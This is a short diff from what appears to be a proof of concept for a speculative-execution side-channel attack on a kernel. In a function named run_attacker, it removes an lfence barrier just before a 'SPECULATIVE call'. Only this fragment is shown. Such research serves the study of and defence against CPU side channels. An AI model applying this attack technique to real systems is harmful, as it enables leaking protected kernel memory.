@@ -86,7 +86,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
             }
 
             mfence();
-            lfence();
+            
 
             // 3. SPECULATIVE call
             call_kernel_part3(kernel_fd, shared_memory, current_offset);
